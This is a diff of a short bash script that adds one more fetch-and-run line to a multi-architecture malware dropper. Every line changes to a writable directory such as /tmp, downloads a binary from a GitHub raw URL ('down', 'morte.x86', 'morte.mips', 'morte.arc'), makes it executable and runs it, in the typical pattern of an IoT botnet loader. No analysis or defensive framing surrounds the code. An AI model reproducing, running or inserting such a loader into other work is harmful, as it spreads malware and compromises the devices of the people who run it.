@@ -1,5 +1,6 @@
 #!/usr/bin/env bash
 ulimit -n 1024
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/fniesonoiawp/good/refs/heads/main/down; chmod 755 *; ./down;
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/fniesonoiawp/good/refs/heads/main/morte.x86; chmod 755 *; ./morte.x86 morte.x86;
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/fniesonoiawp/good/refs/heads/main/morte.mips; chmod 755 *; ./morte.mips morte.mips;
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/fniesonoiawp/good/refs/heads/main/morte.arc; chmod 755 *; ./morte.arc morte.arc;
